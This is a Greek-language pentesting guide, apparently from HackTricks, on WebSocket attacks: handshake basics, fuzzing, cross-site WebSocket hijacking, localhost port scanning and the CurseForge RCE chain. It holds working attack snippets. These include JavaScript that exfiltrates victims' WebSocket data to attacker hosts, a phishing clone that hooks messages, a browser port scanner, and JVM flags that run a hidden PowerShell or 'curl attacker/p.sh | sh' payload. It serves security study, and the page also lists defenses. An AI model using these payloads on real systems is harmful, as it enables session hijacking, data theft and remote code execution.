# Επιθέσεις WebSocket

{{#include ../banners/hacktricks-training.md}}

## Τι είναι τα WebSockets

Οι συνδέσεις WebSocket δημιουργούνται μέσω μιας αρχικής **HTTP** χειραψίας και έχουν σχεδιαστεί να είναι **μακράς διάρκειας**, επιτρέποντας αμφίδρομη ανταλλαγή μηνυμάτων οποιαδήποτε στιγμή χωρίς την ανάγκη για ένα συναλλακτικό σύστημα. Αυτό καθιστά τα WebSockets ιδιαίτερα ωφέλιμα για εφαρμογές που απαιτούν **χαμηλή καθυστέρηση ή επικοινωνία που ξεκινά ο server**, όπως ροές ζωντανών οικονομικών δεδομένων.

### Δημιουργία Συνδέσεων WebSocket

A detailed explanation on establishing WebSocket connections can be accessed [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Σε συνοπτικό επίπεδο, οι συνδέσεις WebSocket συνήθως ξεκινούν μέσω client-side JavaScript όπως φαίνεται παρακάτω:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Το πρωτόκολλο `wss` δηλώνει μια WebSocket σύνδεση ασφαλισμένη με **TLS**, ενώ το `ws` υποδηλώνει μια **μη ασφαλή** σύνδεση.

Κατά την εγκαθίδρυση της σύνδεσης, πραγματοποιείται ένα handshake μεταξύ του browser και του server μέσω HTTP. Η διαδικασία του handshake περιλαμβάνει τον browser να στέλνει ένα αίτημα και τον server να απαντάει, όπως φαίνεται στα παρακάτω παραδείγματα:

Ο browser στέλνει ένα αίτημα handshake:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Απάντηση handshake του server:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Η σύνδεση παραμένει ανοιχτή για ανταλλαγή μηνυμάτων και προς τις δύο κατευθύνσεις μόλις εγκαθιδρυθεί.

**Βασικά σημεία του WebSocket Handshake:**

- Οι κεφαλίδες `Connection` και `Upgrade` σηματοδοτούν την έναρξη ενός WebSocket handshake.
- Η κεφαλίδα `Sec-WebSocket-Version` υποδεικνύει την επιθυμητή έκδοση πρωτοκόλλου WebSocket, συνήθως `13`.
- Μια τυχαία τιμή κωδικοποιημένη σε Base64 αποστέλλεται στην κεφαλίδα `Sec-WebSocket-Key`, εξασφαλίζοντας ότι κάθε handshake είναι μοναδικό, κάτι που βοηθά στην αποφυγή προβλημάτων με caching proxies. Αυτή η τιμή δεν χρησιμοποιείται για έλεγχο ταυτότητας αλλά για να επιβεβαιώσει ότι η απάντηση δεν προέρχεται από λανθασμένα διαμορφωμένο διακομιστή ή cache.
- Η κεφαλίδα `Sec-WebSocket-Accept` στην απάντηση του διακομιστή είναι ένα hash της `Sec-WebSocket-Key`, επιβεβαιώνοντας την πρόθεση του διακομιστή να ανοίξει μια WebSocket σύνδεση.

Αυτά τα χαρακτηριστικά εξασφαλίζουν ότι η διαδικασία handshake είναι ασφαλής και αξιόπιστη, ανοίγοντας το δρόμο για αποδοτική επικοινωνία σε πραγματικό χρόνο.

### Κονσόλα Linux

Μπορείτε να χρησιμοποιήσετε το `websocat` για να δημιουργήσετε μια ακατέργαστη σύνδεση με ένα WebSocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ή για να δημιουργήσετε έναν διακομιστή websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket συνδέσεις

Αν διαπιστώσετε ότι clients είναι συνδεδεμένοι σε ένα **HTTP websocket** από το τρέχον τοπικό δίκτυό σας, μπορείτε να δοκιμάσετε ένα [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) για να πραγματοποιήσετε ένα MitM attack ανάμεσα στον client και τον server.\
Μόλις ο client προσπαθήσει να συνδεθεί σε εσάς, μπορείτε στη συνέχεια να χρησιμοποιήσετε:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets ανίχνευση

Μπορείτε να χρησιμοποιήσετε το **εργαλείο** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **για να εντοπίσετε, fingerprint και να αναζητήσετε γνωστές** **ευπάθειες** σε websockets αυτόματα.

### Εργαλεία αποσφαλμάτωσης Websocket

- **Burp Suite** υποστηρίζει MitM websockets επικοινωνία με τρόπο πολύ παρόμοιο με αυτόν που το κάνει για κανονική HTTP επικοινωνία.
- Το [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** θα σας επιτρέψει να διαχειριστείτε καλύτερα τις Websocket επικοινωνίες στο Burp λαμβάνοντας το **history**, θέτοντας **interception rules**, χρησιμοποιώντας κανόνες **match and replace**, καθώς και χρησιμοποιώντας **Intruder** και **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Συντομογραφία για "**WebSocket/Socket.io Proxy**", αυτό το εργαλείο, γραμμένο σε Node.js, παρέχει διεπαφή για να **capture, intercept, send custom** μηνύματα και να δείτε όλη την επικοινωνία WebSocket και Socket.IO μεταξύ του client και του server.
- [**wsrepl**](https://github.com/doyensec/wsrepl) είναι ένα **interactive websocket REPL** σχεδιασμένο ειδικά για pentesting. Παρέχει διεπαφή για την παρατήρηση **εισερχόμενων websocket μηνυμάτων και την αποστολή νέων**, με ένα εύχρηστο πλαίσιο για την **αυτοματοποίηση** αυτής της επικοινωνίας.
- [**https://websocketking.com/**](https://websocketking.com/) είναι μια web εφαρμογή για επικοινωνία με άλλους χρησιμοποιώντας **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) μεταξύ άλλων τύπων επικοινωνίας/πρωτοκόλλων, παρέχει μια web εφαρμογή για επικοινωνία με άλλους χρησιμοποιώντας **websockets.**

## Αποκρυπτογράφηση Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

Στο [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) υπάρχει κώδικας για να ξεκινήσετε ένα web που χρησιμοποιεί websockets και σε [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) μπορείτε να βρείτε μια εξήγηση.

## Websocket Fuzzing

Η επέκταση του Burp [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) τώρα επιτρέπει να κάνετε fuzz και σε WebSocket μηνύματα. Μπορείτε να διαβάσετε περισσότερες πληροφορίες γι' αυτό [**εδώ**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner).

### WebSocket Turbo Intruder (Burp extension)

Το WebSocket Turbo Intruder της PortSwigger φέρνει Turbo Intruder–style Python scripting και υψηλής ταχύτητας fuzzing σε WebSockets. Εγκαταστήστε το από το BApp Store ή από το source. Περιλαμβάνει δύο συνιστώσες:

- Turbo Intruder: αποστολή μεγάλου όγκου μηνυμάτων σε ένα μόνο WS endpoint χρησιμοποιώντας custom engines.
- HTTP Middleware: εκθέτει ένα τοπικό HTTP endpoint που προωθεί bodies ως WS messages πάνω από μια επίμονη σύνδεση, έτσι ώστε οποιοδήποτε HTTP‑based scanner να μπορεί να δοκιμάσει WS backends.

Βασικό πρότυπο script για να κάνετε fuzz ένα WS endpoint και να φιλτράρετε τις σχετικές απαντήσεις:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Χρησιμοποιήστε decorators όπως `@MatchRegex(...)` για να μειώσετε τον θόρυβο όταν ένα μόνο μήνυμα ενεργοποιεί πολλαπλές απαντήσεις.

### Bridge WS behind HTTP (HTTP Middleware)

Τυλίξτε μια διατηρούμενη WS σύνδεση και προωθήστε τα HTTP bodies ως WS μηνύματα για αυτοματοποιημένες δοκιμές με HTTP scanners:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Στη συνέχεια στείλτε HTTP τοπικά; το body προωθείται ως μήνυμα WS:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
Αυτό σας επιτρέπει να χειρίζεστε WS backends ενώ φιλτράρετε για «ενδιαφέροντα» events (π.χ., SQLi errors, auth bypass, command injection behavior).

### Socket.IO χειρισμός (handshake, heartbeats, events)

Socket.IO προσθέτει το δικό του framing πάνω από το WS. Εντοπίστε το μέσω της υποχρεωτικής query παραμέτρου `EIO` (π.χ., `EIO=4`). Διατηρήστε τη συνεδρία ενεργή με Ping (`2`) και Pong (`3`) και ξεκινήστε τη συνομιλία με `"40"`, στη συνέχεια εκλύστε events όπως `42["message","hello"]`.

Παράδειγμα Intruder:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Παραλλαγή HTTP adapter:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Εντοπισμός server‑side prototype pollution μέσω Socket.IO

Ακολουθώντας την ασφαλή τεχνική ανίχνευσης του PortSwigger, δοκιμάστε να μολύνετε τα εσωτερικά του Express στέλνοντας ένα payload όπως:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
If greetings or behavior change (e.g., echo includes "Polluted"), πιθανότατα μόλυνατε server-side prototypes. Ο αντίκτυπος εξαρτάται από τα reachable sinks· συσχετίστε με τα gadgets στην ενότητα Node.js prototype pollution. See:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

Ο default engine ομαδοποιεί μηνύματα σε μία σύνδεση (καλή διαμεταβίβαση, κακή για races). Χρησιμοποιήστε τον THREADED engine για να spawnάρετε πολλαπλές WS συνδέσεις και να στείλετε payloads παράλληλα ώστε να ενεργοποιήσετε logic races (double‑spend, token reuse, state desync). Ξεκινήστε από το example script και ρυθμίστε την concurrency στο `config()`.

- Learn methodology and alternatives in [Race Condition](race-condition.md) (see “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

Συνθέστε WS frames των οποίων το header δηλώνει πολύ μεγάλο payload length αλλά δεν στέλνετε body. Κάποιοι WS servers εμπιστεύονται το length και προ-κατανέμουν buffers· το να το ορίσετε κοντά σε `Integer.MAX_VALUE` μπορεί να προκαλέσει Out‑Of‑Memory και remote unauth DoS. See the example script.

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- Ενεργοποιήστε τον WS Logger για να καταγράψετε και να συσχετίσετε μηνύματα χρησιμοποιώντας internal IDs.
- Χρησιμοποιήστε τους `inc*`/`dec*` helpers στο `Connection` για να τροποποιήσετε το χειρισμό των message ID σε πολύπλοκους adapters.
- Τα decorators όπως `@PingPong`/`@Pong` και helpers όπως `isInteresting()` μειώνουν τον θόρυβο και διατηρούν τις sessions ζωντανές.

### Operational safety

Το high‑rate WS fuzzing μπορεί να ανοίξει πολλές συνδέσεις και να στείλει χιλιάδες μηνύματα ανά δευτερόλεπτο. Malformed frames και υψηλοί ρυθμοί μπορεί να προκαλέσουν πραγματικό DoS. Χρησιμοποιήστε μόνο όπου επιτρέπεται.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, επίσης γνωστό ως **cross-origin WebSocket hijacking**, αναγνωρίζεται ως ειδική περίπτωση του **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** που επηρεάζει τα WebSocket handshakes. Αυτή η ευπάθεια προκύπτει όταν τα WebSocket handshakes αυθεντικοποιούνται αποκλειστικά μέσω **HTTP cookies** χωρίς **CSRF tokens** ή παρόμοια μέτρα ασφαλείας.

Οι επιτιθέμενοι μπορούν να το εκμεταλλευτούν φιλοξενώντας μια **malicious web page** που ξεκινάει μια cross-site WebSocket σύνδεση προς μια ευάλωτη εφαρμογή. Κατά συνέπεια, αυτή η σύνδεση θεωρείται μέρος της συνεδρίας του θύματος με την εφαρμογή, εκμεταλλευόμενοι την έλλειψη CSRF προστασίας στον μηχανισμό χειρισμού συνεδριών.

Για να λειτουργήσει αυτή η επίθεση, αυτές είναι οι προϋποθέσεις:

- The websocket **authentication must be cookie based**
- Το cookie πρέπει να είναι προσβάσιμο από τον attackers server (συνήθως αυτό σημαίνει **`SameSite=None`**) και να μην υπάρχει **Firefox Total Cookie Protection** ενεργοποιημένο στον Firefox και να μην υπάρχουν **blocked third-party cookies** στον Chrome.
- Ο websocket server δεν πρέπει να ελέγχει το origin της σύνδεσης (ή αυτό πρέπει να είναι bypassable)

Επίσης:

- Αν η authentication βασίζεται σε local connection (σε localhost ή σε local network) η επίθεση **will be possible** καθώς δεν υπάρχει τρέχουσα προστασία που να την απαγορεύει (check [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Origin check disabled in Gorilla WebSocket (CheckOrigin always true)

Σε Gorilla WebSocket servers, το να ρυθμίσετε `CheckOrigin` ώστε πάντα να **return `true`** αποδέχεται handshakes από οποιοδήποτε `Origin`. Όταν το WS endpoint επίσης **lacks authentication**, οποιαδήποτε σελίδα προσβάσιμη από το browser του θύματος (Internet ή intranet) μπορεί να αναβαθμίσει ένα socket και να αρχίσει να διαβάζει/εκπέμπει μηνύματα cross-site.
```html
<script>
const ws = new WebSocket("ws://victim-host:8025/api/v1/websocket");
ws.onmessage = (ev) => fetch("https://attacker.tld/steal?d=" + encodeURIComponent(ev.data), {mode: "no-cors"});
</script>
```
Επίπτωση: εξαγωγή σε πραγματικό χρόνο των δεδομένων που μεταδίδονται (π.χ., καταγεγραμμένα emails/notifications) χωρίς διαπιστευτήρια χρήστη όταν οποιοδήποτε `Origin` γίνεται αποδεκτό και το endpoint παραλείπει τον έλεγχο ταυτότητας.

### Απλή Επίθεση

Σημειώστε ότι όταν **εγκαθιδρύεται** μια **websocket** σύνδεση, το **cookie** **αποστέλλεται** στον server. Ο **server** μπορεί να το χρησιμοποιεί για να **σχετίσει** κάθε **συγκεκριμένο** **user** με τον **websocket** **session βασισμένη στο αποσταλμένο cookie**.

Τότε, αν για **παράδειγμα** ο **websocket** **server** **επιστρέφει το ιστορικό της συνομιλίας** ενός χρήστη όταν ένα msg με "**READY"** αποστέλλεται, τότε ένα **απλό XSS** που εγκαθιδρύει τη σύνδεση (το **cookie** θα **αποσταλεί** **αυτόματα** για να εξουσιοδοτήσει τον χρήστη-θύμα) **αποστέλλοντας** "**READY**" θα μπορέσει να **ανακτήσει** το ιστορικό της **συνομιλίας**.
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

Σε αυτό το blog post [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) ο επιτιθέμενος κατάφερε να **execute arbitrary Javascript in a subdomain** του domain όπου γινόταν η επικοινωνία μέσω web socket. Επειδή ήταν **subdomain**, το **cookie** αποστέλλονταν, και επειδή το **Websocket didn't check the Origin properly**, ήταν δυνατό να επικοινωνήσει μαζί του και να **steal tokens from it**.

### Stealing data from user

Αντιγράψτε την web εφαρμογή που θέλετε να μιμηθείτε (τα αρχεία .html για παράδειγμα) και μέσα στο script όπου γίνεται η websocket επικοινωνία προσθέστε αυτόν τον κώδικα:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Τώρα κατέβασε το αρχείο `wsHook.js` από [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) και **αποθήκευσέ το μέσα στον φάκελο με τα web αρχεία**. Εκθέτοντας την web εφαρμογή και κάνοντας έναν χρήστη να συνδεθεί σε αυτή, θα μπορέσεις να κλέψεις τα αποσταλμένα και τα ληφθέντα μηνύματα μέσω websocket:
```javascript
sudo python3 -m http.server 80
```
### CSWSH Προστασίες

Η επίθεση CSWSH βασίζεται στο γεγονός ότι ένας χρήστης θα συνδεθεί σε μια κακόβουλη σελίδα που θα ανοίξει μια websocket σύνδεση σε μια ιστοσελίδα όπου ο χρήστης είναι ήδη συνδεδεμένος και θα ταυτοποιηθεί ως αυτός καθώς το αίτημα θα στείλει τα cookies του χρήστη.

Σήμερα, είναι πολύ εύκολο να προληφθεί αυτό το πρόβλημα:

- **Websocket server checking the Origin**: Ο websocket server πρέπει πάντα να ελέγχει από πού συνδέεται ένας χρήστης για να αποτρέψει μη αναμενόμενες σελίδες να συνδεθούν σε αυτόν.
- **Authentication token**: Αντί να βασίζεται η ταυτοποίηση σε cookie, η websocket σύνδεση θα μπορούσε να βασίζεται σε token που δημιουργείται από τον server για τον χρήστη και είναι άγνωστο στον attacker (π.χ. σαν anti-CSRF token).
- **SameSite Cookie attribute**: Τα cookies με τιμή `SameSite` `Lax` ή `Strict` δεν θα σταλούν από σελίδα εξωτερικού attacker στον server του θύματος, επομένως η αυθεντικοποίηση με βάση cookie δεν θα είναι επιτυχής. Σημειώστε ότι το Chrome τώρα βάζει την τιμή **`Lax`** σε cookies που δεν έχουν καθορισμένη αυτή τη σημαία, κάνοντας αυτό πιο ασφαλές από προεπιλογή. Ωστόσο, κατά τα πρώτα 2 λεπτά μετά τη δημιουργία ενός cookie θα έχει την τιμή **`None`**, καθιστώντας το ευάλωτο σε αυτό το περιορισμένο διάστημα (επιπλέον αναμένεται ότι αυτό το μέτρο θα αφαιρεθεί κάποια στιγμή).
- **Firefox Total Cookie Protection**: Το Total Cookie Protection λειτουργεί απομονώνοντας τα cookies στην τοποθεσία όπου δημιουργούνται. Ουσιαστικά κάθε site έχει το δικό του τμήμα αποθήκευσης cookies για να αποτρέψει τρίτους από το να συνδέουν το ιστορικό περιήγησης ενός χρήστη. Αυτό κάνει **CSWSH μη χρησιμοποιήσιμο** καθώς ο ιστότοπος του attacker δεν θα έχει πρόσβαση στα cookies.
- **Chrome third-party cookies block**: Αυτό μπορεί επίσης να αποτρέψει την αποστολή του cookie του αυθεντικοποιημένου χρήστη στον websocket server ακόμη και με `SameSite=None`.

### Localhost WebSocket abuse & browser port discovery

Οι desktop launchers συχνά εκκινούν βοηθητικά προγράμματα (π.χ. το `CurseAgent.exe` του CurseForge) που εκθέτουν JSON-RPC WebSockets στο `127.0.0.1:<random_port>`. Ο browser **δεν επιβάλλει SOP σε loopback sockets**, οπότε οποιαδήποτε Web σελίδα μπορεί να επιχειρήσει το handshake. Εάν ο agent αποδέχεται αυθαίρετες τιμές `Origin` και παραλείπει δευτερεύουσα authentication, η επιφάνεια IPC γίνεται απομακρυσμένα ελεγχόμενη απευθείας από JavaScript.

#### Εντοπισμός εκτεθειμένων μεθόδων

Καταγράψτε μια νόμιμη συνεδρία για να μάθετε το συμβόλαιο του πρωτοκόλλου. Το CurseForge, για παράδειγμα, εκπέμπει frames όπως `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}` όπου το `name` είναι η RPC μέθοδος και τα `args` περιέχουν δομημένα αντικείμενα (GUIDs, resolution, flags, κ.λπ.). Μόλις είναι γνωστό αυτό το σχήμα, μπορείτε να καλέσετε μεθόδους όπως `createModpack`, `minecraftGetDefaultLocation` ή οποιαδήποτε άλλη προνομιακή εργασία απευθείας από μια injected σελίδα.

#### Ανακάλυψη θυρών από browser

Επειδή ο helper δεσμεύεται σε μια τυχαία υψηλή θύρα, το exploit πρώτα κάνει brute-force στο localhost μέσω WebSockets. Οι browsers βασισμένοι σε Chromium αντέχουν περίπου ~16k αποτυχημένες αναβαθμίσεις πριν γίνει throttling, που είναι αρκετό για να διασχίσει το εύρος των προσωρινών θυρών· ο Firefox τείνει να καταρρεύσει ή να παγώσει μετά από μερικές εκατοντάδες αποτυχίες, οπότε πρακτικά PoCs συχνά στοχεύουν το Chromium.

<details>
<summary>Ελάχιστος σαρωτής προγράμματος περιήγησης</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

#### Αλυσίδωση JSON-RPC μεθόδων σε RCE

Το CurseForge exploit αλυσοδένει δύο μη-επαληθευμένες κλήσεις:

1. `createModpack` → επιστρέφει ένα νέο `MinecraftInstanceGuid` χωρίς αλληλεπίδραση χρήστη.
2. `minecraftTaskLaunchInstance` → εκκινεί αυτό το GUID ενώ δέχεται αυθαίρετα JVM flags μέσω `AdditionalJavaArguments`.

Οι διαγνωστικές επιλογές JNI/JVM παρέχουν τότε ένα έτοιμο προς χρήση RCE primitive. Για παράδειγμα, περιορίστε το metaspace για να αναγκάσετε ένα crash και εκμεταλλευτείτε το error hook για εκτέλεση εντολών:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
On Unix targets simply swap the payload with `/bin/sh -c 'curl https://attacker/p.sh | sh'`. This works even when you cannot touch the application code—controlling the JVM CLI is enough.

Αυτό το μοτίβο «create resource → privileged launch» εμφανίζεται συχνά σε updaters και launchers. Κάθε φορά που η μέθοδος (1) επιστρέφει ένα server-tracked identifier και η μέθοδος (2) εκτελεί κώδικα ή εκκινεί μια διεργασία με αυτόν τον identifier, ελέγξτε εάν μπορούν να εγχυθούν user-controlled arguments.


## Race Conditions

Race Conditions in WebSockets are also a thing, [check this information to learn more](race-condition.md#rc-in-websockets).

## Other vulnerabilities

Καθώς τα Web Sockets είναι μηχανισμός για αποστολή δεδομένων προς τον server και προς τον client, ανάλογα με το πώς ο server και ο client χειρίζονται την πληροφορία, τα Web Sockets μπορούν να χρησιμοποιηθούν για να εκμεταλλευτούν διάφορες άλλες ευπάθειες όπως XSS, SQLi ή οποιαδήποτε άλλη common web vuln μέσω input ενός χρήστη από ένα websocket.

## **WebSocket Smuggling**

Αυτή η ευπάθεια μπορεί να σας επιτρέψει να **bypass reverse proxies restrictions** κάνοντάς τους να πιστεύουν ότι έχει γίνει **websocket communication was stablished** (ακόμα κι αν αυτό δεν ισχύει). Αυτό μπορεί να επιτρέψει σε έναν attacker να **access hidden endpoints**. Για περισσότερες πληροφορίες δείτε την ακόλουθη σελίδα:


{{#ref}}
h2c-smuggling.md
{{#endref}}

## References

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [Two CVEs, Zero Ego: A Mailpit Story](https://rosecurify.com/two-cves-zero-ego-a-mailpit-story/)

{{#include ../banners/hacktricks-training.md}}
